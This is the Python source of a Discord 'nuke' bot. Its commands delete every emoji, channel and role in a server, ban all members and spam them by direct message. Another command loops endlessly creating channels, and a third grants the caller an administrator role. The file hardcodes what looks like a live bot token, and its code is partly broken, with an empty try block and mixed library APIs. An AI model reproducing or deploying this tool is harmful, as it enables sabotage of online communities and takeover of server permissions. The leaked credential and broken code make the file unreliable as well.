#bot created by Sir Sinister
#make sure to read the read me file for instructions

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio

client = commands.Bot(command_prefix='$') #This Is The Prefix, Feel Free To Change It Anytime

client.remove_command("help")


@client.event
async def on_ready():
    print ("bot is now online")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def destroy(ctx, *, message):
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print (f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
                await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
                await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
        print ("Action Completed: destroy")
      
@client.command(pass_context=True)
async def sc(self, ctx, name):
    while 1:
        await ctx.guild.create_channel("RIP")

@client.command(pass_context=True)
async def dab(ctx):
    server = ctx.message.server
    perms = discord.Permissions(8)
    await client.create_role(server, name='dab', permissions=perms)
    user = ctx.message.author
    role = discord.utils.get(user.server.roles, name="dab")
    await client.add_roles(user, role)
    print ("You're in buddy, now don't fuck it up")

client.run("NzM3OTU3NzMyMjMzMTE3ODQ5.XyE6sQ.MsF6DHkN-efdXp3ZTL03r6iBEV8") #Bot's Token Code Goes Here
